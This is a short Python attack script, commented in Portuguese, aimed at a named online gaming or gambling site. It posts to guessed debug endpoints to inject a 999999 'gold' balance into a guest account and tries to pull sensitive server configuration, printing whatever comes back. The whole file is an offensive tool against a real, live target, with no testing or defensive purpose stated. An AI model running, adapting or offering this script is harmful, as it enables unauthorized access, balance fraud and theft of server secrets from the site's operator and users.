import requests
import json

API_BASE = "https://vipvip.vip999jogo.com"
GUEST_ACCOUNT = "web_lobby_guest_account"

def exploit_api():
    print("[*] Iniciando Manipulação de API de Elite")
    
    # 1. Tentativa de Injeção de Saldo via API (Simulação de falha de lógica)
    print("[*] Testando endpoint de atualização de saldo...")
    payload = {
        "account": GUEST_ACCOUNT,
        "action": "add_gold",
        "amount": 999999
    }
    try:
        # Endpoints comuns em APIs de jogos para depuração
        debug_endpoints = ["/hall/api/gohal/debug_add", "/hall/api/gohal/update_user"]
        for ep in debug_endpoints:
            res = requests.post(f"{API_BASE}{ep}", json=payload, timeout=5)
            print(f"    Endpoint {ep} -> Status: {res.status_code}")
    except Exception as e:
        print(f"    Erro: {e}")

    # 2. Extração de Configurações do Servidor
    print("[*] Extraindo configurações sensíveis do servidor...")
    try:
        res = requests.get(f"{API_BASE}/hall/api/gohal/config", timeout=5)
        if res.status_code == 200:
            print("[!] CONFIGURAÇÕES EXPOSTAS!")
            print(res.text[:200])
    except Exception as e:
        print(f"    Erro: {e}")

if __name__ == "__main__":
    exploit_api()
